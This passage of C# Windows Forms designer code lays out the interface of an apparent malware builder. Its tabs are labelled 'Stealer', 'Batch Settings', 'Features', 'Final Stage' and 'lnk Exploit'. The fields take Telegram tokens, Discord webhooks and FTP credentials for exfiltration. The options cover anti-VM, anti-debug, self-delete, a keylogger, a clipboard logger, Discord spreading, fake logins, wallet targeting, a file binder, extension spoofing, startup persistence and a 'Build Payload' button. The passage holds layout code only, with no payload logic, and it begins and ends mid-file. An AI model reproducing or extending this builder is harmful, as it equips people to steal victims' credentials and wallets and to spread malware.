            this.txtPORT.TabIndex = 48;
            this.txtPORT.Text = "PORT";
            // 
            // label5
            // 
            this.label5.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.label5.AutoSize = true;
            this.label5.Location = new System.Drawing.Point(501, 228);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(41, 13);
            this.label5.TabIndex = 8;
            this.label5.Text = "Path :";
            this.label5.Visible = false;
            // 
            // tabPage2
            // 
            this.tabPage2.BackColor = System.Drawing.Color.White;
            this.tabPage2.Controls.Add(this.studioButton2);
            this.tabPage2.Controls.Add(this.txtPHPLINK);
            this.tabPage2.Controls.Add(this.txtFTPPASS);
            this.tabPage2.Controls.Add(this.txtFTPUSER);
            this.tabPage2.Controls.Add(this.txtFTPHOST);
            this.tabPage2.Controls.Add(this.txtWebHook);
            this.tabPage2.Controls.Add(this.txtTGID);
            this.tabPage2.Controls.Add(this.txtTGTOKEN);
            this.tabPage2.Location = new System.Drawing.Point(4, 28);
            this.tabPage2.Name = "tabPage2";
            this.tabPage2.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage2.Size = new System.Drawing.Size(1054, 560);
            this.tabPage2.TabIndex = 1;
            this.tabPage2.Text = "Stealer";
            // 
            // studioButton2
            // 
            this.studioButton2.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.studioButton2.BackColor = System.Drawing.Color.Transparent;
            bloom103.Name = "DownGradient1";
            bloom103.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom104.Name = "DownGradient2";
            bloom104.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom105.Name = "NoneGradient1";
            bloom105.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom106.Name = "NoneGradient2";
            bloom106.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom107.Name = "Shine1";
            bloom107.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom108.Name = "Shine2A";
            bloom108.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom109.Name = "Shine2B";
            bloom109.Value = System.Drawing.Color.Transparent;
            bloom110.Name = "Shine3";
            bloom110.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom111.Name = "TextShade";
            bloom111.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            bloom112.Name = "Text";
            bloom112.Value = System.Drawing.Color.White;
            bloom113.Name = "Glow";
            bloom113.Value = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom114.Name = "Border";
            bloom114.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            bloom115.Name = "Corners";
            bloom115.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            this.studioButton2.Colors = new ShitarusPrivate.Bloom[] {
        bloom103,
        bloom104,
        bloom105,
        bloom106,
        bloom107,
        bloom108,
        bloom109,
        bloom110,
        bloom111,
        bloom112,
        bloom113,
        bloom114,
        bloom115};
            this.studioButton2.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton2.Font = new System.Drawing.Font("Verdana", 8F);
            this.studioButton2.Image = null;
            this.studioButton2.Location = new System.Drawing.Point(581, 408);
            this.studioButton2.Name = "studioButton2";
            this.studioButton2.NoRounding = false;
            this.studioButton2.Size = new System.Drawing.Size(71, 30);
            this.studioButton2.TabIndex = 113;
            this.studioButton2.Text = "Save";
            this.studioButton2.Transparent = true;
            this.studioButton2.Click += new System.EventHandler(this.studioButton2_Click);
            // 
            // txtPHPLINK
            // 
            this.txtPHPLINK.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.txtPHPLINK.Location = new System.Drawing.Point(402, 372);
            this.txtPHPLINK.Multiline = true;
            this.txtPHPLINK.Name = "txtPHPLINK";
            this.txtPHPLINK.Size = new System.Drawing.Size(250, 30);
            this.txtPHPLINK.TabIndex = 112;
            this.txtPHPLINK.Text = "PHP Link (optional)";
            // 
            // txtFTPPASS
            // 
            this.txtFTPPASS.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.txtFTPPASS.Location = new System.Drawing.Point(402, 336);
            this.txtFTPPASS.Multiline = true;
            this.txtFTPPASS.Name = "txtFTPPASS";
            this.txtFTPPASS.Size = new System.Drawing.Size(250, 30);
            this.txtFTPPASS.TabIndex = 111;
            this.txtFTPPASS.Text = "FTP Pass (optional)";
            // 
            // txtFTPUSER
            // 
            this.txtFTPUSER.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.txtFTPUSER.Location = new System.Drawing.Point(402, 300);
            this.txtFTPUSER.Multiline = true;
            this.txtFTPUSER.Name = "txtFTPUSER";
            this.txtFTPUSER.Size = new System.Drawing.Size(250, 30);
            this.txtFTPUSER.TabIndex = 110;
            this.txtFTPUSER.Text = "FTP User (optional)";
            // 
            // txtFTPHOST
            // 
            this.txtFTPHOST.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.txtFTPHOST.Location = new System.Drawing.Point(402, 264);
            this.txtFTPHOST.Multiline = true;
            this.txtFTPHOST.Name = "txtFTPHOST";
            this.txtFTPHOST.Size = new System.Drawing.Size(250, 30);
            this.txtFTPHOST.TabIndex = 109;
            this.txtFTPHOST.Text = "FTP Host (optional)";
            // 
            // tabPage3
            // 
            this.tabPage3.BackColor = System.Drawing.Color.White;
            this.tabPage3.Controls.Add(this.xorEncryption);
            this.tabPage3.Controls.Add(this.groupBox1);
            this.tabPage3.Controls.Add(this.aesEncryption);
            this.tabPage3.Controls.Add(this.key1);
            this.tabPage3.Controls.Add(this.key2);
            this.tabPage3.Controls.Add(this.iv1);
            this.tabPage3.Controls.Add(this.iv6);
            this.tabPage3.Controls.Add(this.refreshKeys);
            this.tabPage3.Location = new System.Drawing.Point(4, 28);
            this.tabPage3.Name = "tabPage3";
            this.tabPage3.Size = new System.Drawing.Size(1054, 560);
            this.tabPage3.TabIndex = 2;
            this.tabPage3.Text = "Batch Settings";
            // 
            // xorEncryption
            // 
            this.xorEncryption.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.xorEncryption.AutoSize = true;
            this.xorEncryption.Enabled = false;
            this.xorEncryption.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.xorEncryption.Location = new System.Drawing.Point(380, 117);
            this.xorEncryption.Margin = new System.Windows.Forms.Padding(2);
            this.xorEncryption.Name = "xorEncryption";
            this.xorEncryption.Size = new System.Drawing.Size(112, 19);
            this.xorEncryption.TabIndex = 67;
            this.xorEncryption.Text = "XOR Encryption";
            this.xorEncryption.UseVisualStyleBackColor = true;
            this.xorEncryption.CheckedChanged += new System.EventHandler(this.xorEncryption_CheckedChanged);
            // 
            // groupBox1
            // 
            this.groupBox1.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
            this.groupBox1.Controls.Add(this.selfDelete);
            this.groupBox1.Controls.Add(this.hidden);
            this.groupBox1.Controls.Add(this.label12);
            this.groupBox1.Controls.Add(this.label13);
            this.groupBox1.Controls.Add(this.antiDebug);
            this.groupBox1.Controls.Add(this.label14);
            this.groupBox1.Controls.Add(this.label15);
            this.groupBox1.Controls.Add(this.antiVM);
            this.groupBox1.Location = new System.Drawing.Point(348, 325);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(332, 99);
            this.groupBox1.TabIndex = 110;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "Batch Options";
            // 
            // aesEncryption
            // 
            this.aesEncryption.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.aesEncryption.AutoSize = true;
            this.aesEncryption.Checked = true;
            this.aesEncryption.CheckState = System.Windows.Forms.CheckState.Checked;
            this.aesEncryption.Enabled = false;
            this.aesEncryption.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.aesEncryption.Location = new System.Drawing.Point(527, 117);
            this.aesEncryption.Margin = new System.Windows.Forms.Padding(2);
            this.aesEncryption.Name = "aesEncryption";
            this.aesEncryption.Size = new System.Drawing.Size(102, 19);
            this.aesEncryption.TabIndex = 66;
            this.aesEncryption.Text = "AES Ecryption";
            this.aesEncryption.UseVisualStyleBackColor = true;
            this.aesEncryption.CheckedChanged += new System.EventHandler(this.aesEncryption_CheckedChanged);
            // 
            // key1
            // 
            this.key1.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.key1.BackColor = System.Drawing.Color.White;
            this.key1.Enabled = false;
            this.key1.Location = new System.Drawing.Point(380, 140);
            this.key1.Margin = new System.Windows.Forms.Padding(2);
            this.key1.Multiline = true;
            this.key1.Name = "key1";
            this.key1.ReadOnly = true;
            this.key1.Size = new System.Drawing.Size(250, 30);
            this.key1.TabIndex = 69;
            this.key1.Text = "Keys";
            // 
            // key2
            // 
            this.key2.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.key2.BackColor = System.Drawing.Color.White;
            this.key2.Enabled = false;
            this.key2.Location = new System.Drawing.Point(380, 181);
            this.key2.Margin = new System.Windows.Forms.Padding(2);
            this.key2.Multiline = true;
            this.key2.Name = "key2";
            this.key2.ReadOnly = true;
            this.key2.Size = new System.Drawing.Size(250, 30);
            this.key2.TabIndex = 71;
            this.key2.Text = "Keys";
            // 
            // iv1
            // 
            this.iv1.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.iv1.BackColor = System.Drawing.Color.White;
            this.iv1.Enabled = false;
            this.iv1.Location = new System.Drawing.Point(380, 221);
            this.iv1.Margin = new System.Windows.Forms.Padding(2);
            this.iv1.Multiline = true;
            this.iv1.Name = "iv1";
            this.iv1.ReadOnly = true;
            this.iv1.Size = new System.Drawing.Size(250, 30);
            this.iv1.TabIndex = 72;
            this.iv1.Text = "IVs";
            // 
            // iv6
            // 
            this.iv6.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.iv6.BackColor = System.Drawing.Color.White;
            this.iv6.Enabled = false;
            this.iv6.Location = new System.Drawing.Point(380, 263);
            this.iv6.Margin = new System.Windows.Forms.Padding(2);
            this.iv6.Multiline = true;
            this.iv6.Name = "iv6";
            this.iv6.ReadOnly = true;
            this.iv6.Size = new System.Drawing.Size(250, 30);
            this.iv6.TabIndex = 73;
            this.iv6.Text = "IVs";
            // 
            // refreshKeys
            // 
            this.refreshKeys.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.refreshKeys.BackColor = System.Drawing.Color.Transparent;
            bloom116.Name = "DownGradient1";
            bloom116.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom117.Name = "DownGradient2";
            bloom117.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom118.Name = "NoneGradient1";
            bloom118.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom119.Name = "NoneGradient2";
            bloom119.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom120.Name = "Shine1";
            bloom120.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom121.Name = "Shine2A";
            bloom121.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom122.Name = "Shine2B";
            bloom122.Value = System.Drawing.Color.Transparent;
            bloom123.Name = "Shine3";
            bloom123.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom124.Name = "TextShade";
            bloom124.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            bloom125.Name = "Text";
            bloom125.Value = System.Drawing.Color.White;
            bloom126.Name = "Glow";
            bloom126.Value = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom127.Name = "Border";
            bloom127.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            bloom128.Name = "Corners";
            bloom128.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            this.refreshKeys.Colors = new ShitarusPrivate.Bloom[] {
        bloom116,
        bloom117,
        bloom118,
        bloom119,
        bloom120,
        bloom121,
        bloom122,
        bloom123,
        bloom124,
        bloom125,
        bloom126,
        bloom127,
        bloom128};
            this.refreshKeys.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.refreshKeys.Enabled = false;
            this.refreshKeys.Font = new System.Drawing.Font("Verdana", 8F);
            this.refreshKeys.Image = null;
            this.refreshKeys.Location = new System.Drawing.Point(636, 263);
            this.refreshKeys.Name = "refreshKeys";
            this.refreshKeys.NoRounding = false;
            this.refreshKeys.Size = new System.Drawing.Size(71, 30);
            this.refreshKeys.TabIndex = 75;
            this.refreshKeys.Text = "Refresh";
            this.refreshKeys.Transparent = true;
            this.refreshKeys.Click += new System.EventHandler(this.UpdateKeys);
            // 
            // tabPage4
            // 
            this.tabPage4.BackColor = System.Drawing.Color.White;
            this.tabPage4.Controls.Add(this.label35);
            this.tabPage4.Controls.Add(this.txtDiscMessage);
            this.tabPage4.Controls.Add(this.txtDiscordFilename);
            this.tabPage4.Controls.Add(this.primeButton4);
            this.tabPage4.Controls.Add(this.txtDiscFilePath);
            this.tabPage4.Controls.Add(this.groupBox2);
            this.tabPage4.Controls.Add(this.groupBox3);
            this.tabPage4.Location = new System.Drawing.Point(4, 28);
            this.tabPage4.Name = "tabPage4";
            this.tabPage4.Size = new System.Drawing.Size(1054, 560);
            this.tabPage4.TabIndex = 3;
            this.tabPage4.Text = "Features";
            // 
            // label35
            // 
            this.label35.AutoSize = true;
            this.label35.Location = new System.Drawing.Point(641, 370);
            this.label35.Name = "label35";
            this.label35.Size = new System.Drawing.Size(32, 13);
            this.label35.TabIndex = 118;
            this.label35.Text = ".exe";
            // 
            // groupBox2
            // 
            this.groupBox2.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
            this.groupBox2.Controls.Add(this.label24);
            this.groupBox2.Controls.Add(this.toggleSwitch1);
            this.groupBox2.Controls.Add(this.label23);
            this.groupBox2.Controls.Add(this.chkClogger);
            this.groupBox2.Controls.Add(this.label22);
            this.groupBox2.Controls.Add(this.chkKlogger);
            this.groupBox2.Controls.Add(this.label32);
            this.groupBox2.Controls.Add(this.chkSpread);
            this.groupBox2.Controls.Add(this.chkAdvanceBotK);
            this.groupBox2.Controls.Add(this.chkFakeLogin);
            this.groupBox2.Controls.Add(this.label19);
            this.groupBox2.Controls.Add(this.label28);
            this.groupBox2.Controls.Add(this.chkBotK);
            this.groupBox2.Controls.Add(this.label27);
            this.groupBox2.Controls.Add(this.chkUCA);
            this.groupBox2.Controls.Add(this.chkWDEX);
            this.groupBox2.Controls.Add(this.label2);
            this.groupBox2.Controls.Add(this.label1);
            this.groupBox2.Controls.Add(this.chkStartup);
            this.groupBox2.Controls.Add(this.chkWatcher);
            this.groupBox2.Controls.Add(this.label11);
            this.groupBox2.Controls.Add(this.label6);
            this.groupBox2.Location = new System.Drawing.Point(129, 98);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Size = new System.Drawing.Size(790, 160);
            this.groupBox2.TabIndex = 111;
            this.groupBox2.TabStop = false;
            this.groupBox2.Text = "Features";
            // 
            // groupBox3
            // 
            this.groupBox3.Controls.Add(this.chkExecS);
            this.groupBox3.Controls.Add(this.label36);
            this.groupBox3.Controls.Add(this.label34);
            this.groupBox3.Controls.Add(this.label33);
            this.groupBox3.Location = new System.Drawing.Point(129, 284);
            this.groupBox3.Name = "groupBox3";
            this.groupBox3.Size = new System.Drawing.Size(790, 264);
            this.groupBox3.TabIndex = 119;
            this.groupBox3.TabStop = false;
            this.groupBox3.Text = "Discord Spread Settings";
            // 
            // label34
            // 
            this.label34.AutoSize = true;
            this.label34.Location = new System.Drawing.Point(564, 36);
            this.label34.Name = "label34";
            this.label34.Size = new System.Drawing.Size(141, 13);
            this.label34.TabIndex = 114;
            this.label34.Text = "Payload selected: None";
            // 
            // label33
            // 
            this.label33.AutoSize = true;
            this.label33.Location = new System.Drawing.Point(564, 53);
            this.label33.Name = "label33";
            this.label33.Size = new System.Drawing.Size(128, 13);
            this.label33.TabIndex = 115;
            this.label33.Text = "Payload added: False";
            // 
            // tabPage5
            // 
            this.tabPage5.BackColor = System.Drawing.Color.White;
            this.tabPage5.Controls.Add(this.btnBinderDelete);
            this.tabPage5.Controls.Add(this.label38);
            this.tabPage5.Controls.Add(this.listBox1);
            this.tabPage5.Controls.Add(this.btnBinderBrowse);
            this.tabPage5.Controls.Add(this.label17);
            this.tabPage5.Controls.Add(this.rjComboBox1);
            this.tabPage5.Controls.Add(this.label37);
            this.tabPage5.Controls.Add(this.chkTargetWallets);
            this.tabPage5.Controls.Add(this.chkSpoof);
            this.tabPage5.Controls.Add(this.label31);
            this.tabPage5.Controls.Add(this.pictureBox5);
            this.tabPage5.Controls.Add(this.pictureBox4);
            this.tabPage5.Controls.Add(this.pictureBox3);
            this.tabPage5.Controls.Add(this.chkNet2);
            this.tabPage5.Controls.Add(this.label9);
            this.tabPage5.Controls.Add(this.label8);
            this.tabPage5.Controls.Add(this.listBox2);
            this.tabPage5.Controls.Add(this.pictureBox2);
            this.tabPage5.Controls.Add(this.linkLabel1);
            this.tabPage5.Controls.Add(this.chkNet4);
            this.tabPage5.Controls.Add(this.button1);
            this.tabPage5.Location = new System.Drawing.Point(4, 28);
            this.tabPage5.Name = "tabPage5";
            this.tabPage5.Size = new System.Drawing.Size(1054, 560);
            this.tabPage5.TabIndex = 4;
            this.tabPage5.Text = "Final Stage";
            // 
            // label38
            // 
            this.label38.AutoSize = true;
            this.label38.Location = new System.Drawing.Point(515, 165);
            this.label38.Name = "label38";
            this.label38.Size = new System.Drawing.Size(49, 13);
            this.label38.TabIndex = 117;
            this.label38.Text = "Binder:";
            // 
            // listBox1
            // 
            this.listBox1.Enabled = false;
            this.listBox1.ForeColor = System.Drawing.Color.Black;
            this.listBox1.FormattingEnabled = true;
            this.listBox1.Location = new System.Drawing.Point(518, 180);
            this.listBox1.Margin = new System.Windows.Forms.Padding(2);
            this.listBox1.Name = "listBox1";
            this.listBox1.Size = new System.Drawing.Size(254, 173);
            this.listBox1.TabIndex = 116;
            // 
            // rjComboBox1
            // 
            this.rjComboBox1.FormattingEnabled = true;
            this.rjComboBox1.Items.AddRange(new object[] {
            ".jpg",
            ".png",
            ".mp3",
            ".mp4",
            ".txt",
            ".pptx",
            ".cmd"});
            this.rjComboBox1.Location = new System.Drawing.Point(400, 392);
            this.rjComboBox1.Name = "rjComboBox1";
            this.rjComboBox1.Size = new System.Drawing.Size(254, 21);
            this.rjComboBox1.TabIndex = 104;
            // 
            // label31
            // 
            this.label31.AutoSize = true;
            this.label31.Location = new System.Drawing.Point(257, 165);
            this.label31.Name = "label31";
            this.label31.Size = new System.Drawing.Size(82, 13);
            this.label31.TabIndex = 100;
            this.label31.Text = "Builder Logs:";
            // 
            // pictureBox5
            // 
            this.pictureBox5.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.pictureBox5.Location = new System.Drawing.Point(97, 503);
            this.pictureBox5.Name = "pictureBox5";
            this.pictureBox5.Size = new System.Drawing.Size(32, 29);
            this.pictureBox5.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox5.TabIndex = 99;
            this.pictureBox5.TabStop = false;
            this.pictureBox5.Click += new System.EventHandler(this.pictureBox5_Click);
            // 
            // pictureBox4
            // 
            this.pictureBox4.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.pictureBox4.Location = new System.Drawing.Point(57, 503);
            this.pictureBox4.Name = "pictureBox4";
            this.pictureBox4.Size = new System.Drawing.Size(32, 29);
            this.pictureBox4.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox4.TabIndex = 98;
            this.pictureBox4.TabStop = false;
            this.pictureBox4.Click += new System.EventHandler(this.pictureBox4_Click);
            // 
            // pictureBox3
            // 
            this.pictureBox3.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.pictureBox3.Location = new System.Drawing.Point(17, 503);
            this.pictureBox3.Name = "pictureBox3";
            this.pictureBox3.Size = new System.Drawing.Size(32, 29);
            this.pictureBox3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox3.TabIndex = 97;
            this.pictureBox3.TabStop = false;
            this.pictureBox3.Click += new System.EventHandler(this.pictureBox3_Click);
            // 
            // listBox2
            // 
            this.listBox2.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.listBox2.ForeColor = System.Drawing.Color.Black;
            this.listBox2.FormattingEnabled = true;
            this.listBox2.Location = new System.Drawing.Point(260, 180);
            this.listBox2.Margin = new System.Windows.Forms.Padding(2);
            this.listBox2.Name = "listBox2";
            this.listBox2.Size = new System.Drawing.Size(254, 173);
            this.listBox2.TabIndex = 76;
            // 
            // pictureBox2
            // 
            this.pictureBox2.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.pictureBox2.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox2.Image")));
            this.pictureBox2.Location = new System.Drawing.Point(444, 26);
            this.pictureBox2.Name = "pictureBox2";
            this.pictureBox2.Size = new System.Drawing.Size(166, 131);
            this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox2.TabIndex = 77;
            this.pictureBox2.TabStop = false;
            // 
            // linkLabel1
            // 
            this.linkLabel1.ActiveLinkColor = System.Drawing.Color.SteelBlue;
            this.linkLabel1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.linkLabel1.AutoSize = true;
            this.linkLabel1.LinkColor = System.Drawing.Color.DodgerBlue;
            this.linkLabel1.Location = new System.Drawing.Point(135, 511);
            this.linkLabel1.Name = "linkLabel1";
            this.linkLabel1.Size = new System.Drawing.Size(65, 13);
            this.linkLabel1.TabIndex = 96;
            this.linkLabel1.TabStop = true;
            this.linkLabel1.Text = "HF Thread";
            this.linkLabel1.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.linkLabel1_LinkClicked);
            // 
            // button1
            // 
            this.button1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            bloom129.Name = "DownGradient1";
            bloom129.Value = System.Drawing.Color.FromArgb(((int)(((byte)(215)))), ((int)(((byte)(215)))), ((int)(((byte)(215)))));
            bloom130.Name = "DownGradient2";
            bloom130.Value = System.Drawing.Color.FromArgb(((int)(((byte)(235)))), ((int)(((byte)(235)))), ((int)(((byte)(235)))));
            bloom131.Name = "NoneGradient1";
            bloom131.Value = System.Drawing.Color.FromArgb(((int)(((byte)(235)))), ((int)(((byte)(235)))), ((int)(((byte)(235)))));
            bloom132.Name = "NoneGradient2";
            bloom132.Value = System.Drawing.Color.FromArgb(((int)(((byte)(215)))), ((int)(((byte)(215)))), ((int)(((byte)(215)))));
            bloom133.Name = "NoneGradient3";
            bloom133.Value = System.Drawing.Color.FromArgb(((int)(((byte)(252)))), ((int)(((byte)(252)))), ((int)(((byte)(252)))));
            bloom134.Name = "NoneGradient4";
            bloom134.Value = System.Drawing.Color.FromArgb(((int)(((byte)(242)))), ((int)(((byte)(242)))), ((int)(((byte)(242)))));
            bloom135.Name = "Glow";
            bloom135.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom136.Name = "TextShade";
            bloom136.Value = System.Drawing.Color.White;
            bloom137.Name = "Text";
            bloom137.Value = System.Drawing.Color.FromArgb(((int)(((byte)(80)))), ((int)(((byte)(80)))), ((int)(((byte)(80)))));
            bloom138.Name = "Border1";
            bloom138.Value = System.Drawing.Color.White;
            bloom139.Name = "Border2";
            bloom139.Value = System.Drawing.Color.FromArgb(((int)(((byte)(180)))), ((int)(((byte)(180)))), ((int)(((byte)(180)))));
            this.button1.Colors = new ShitarusPrivate.Bloom[] {
        bloom129,
        bloom130,
        bloom131,
        bloom132,
        bloom133,
        bloom134,
        bloom135,
        bloom136,
        bloom137,
        bloom138,
        bloom139};
            this.button1.Customization = "19fX/+vr6//r6+v/19fX//z8/P/y8vL/////Mv////9QUFD//////7S0tP8=";
            this.button1.Font = new System.Drawing.Font("Verdana", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button1.Image = null;
            this.button1.Location = new System.Drawing.Point(847, 502);
            this.button1.Name = "button1";
            this.button1.NoRounding = false;
            this.button1.Size = new System.Drawing.Size(194, 30);
            this.button1.TabIndex = 37;
            this.button1.Text = "Build Payload";
            this.button1.Transparent = false;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // tabPage6
            // 
            this.tabPage6.BackColor = System.Drawing.Color.White;
            this.tabPage6.Controls.Add(this.txtSdesc);
            this.tabPage6.Controls.Add(this.txtSname);
            this.tabPage6.Controls.Add(this.iconPreview);
            this.tabPage6.Controls.Add(this.studioButton1);
            this.tabPage6.Controls.Add(this.btnBrowseIcon);
            this.tabPage6.Controls.Add(this.txtIconPath);
            this.tabPage6.Controls.Add(this.txtUrl);
            this.tabPage6.Location = new System.Drawing.Point(4, 28);
            this.tabPage6.Name = "tabPage6";
            this.tabPage6.Size = new System.Drawing.Size(1054, 560);
            this.tabPage6.TabIndex = 5;
            this.tabPage6.Text = "lnk Exploit";
            // 
            // iconPreview
            // 
            this.iconPreview.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.iconPreview.Location = new System.Drawing.Point(307, 159);
            this.iconPreview.Name = "iconPreview";
            this.iconPreview.Size = new System.Drawing.Size(64, 64);
            this.iconPreview.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.iconPreview.TabIndex = 117;
            this.iconPreview.TabStop = false;
            // 
            // studioButton1
            // 
            this.studioButton1.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.studioButton1.BackColor = System.Drawing.Color.Transparent;
            bloom140.Name = "DownGradient1";
            bloom140.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom141.Name = "DownGradient2";
            bloom141.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom142.Name = "NoneGradient1";
            bloom142.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom143.Name = "NoneGradient2";
            bloom143.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom144.Name = "Shine1";
            bloom144.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom145.Name = "Shine2A";
            bloom145.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom146.Name = "Shine2B";
            bloom146.Value = System.Drawing.Color.Transparent;
            bloom147.Name = "Shine3";
            bloom147.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom148.Name = "TextShade";
            bloom148.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            bloom149.Name = "Text";
            bloom149.Value = System.Drawing.Color.White;
            bloom150.Name = "Glow";
            bloom150.Value = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom151.Name = "Border";
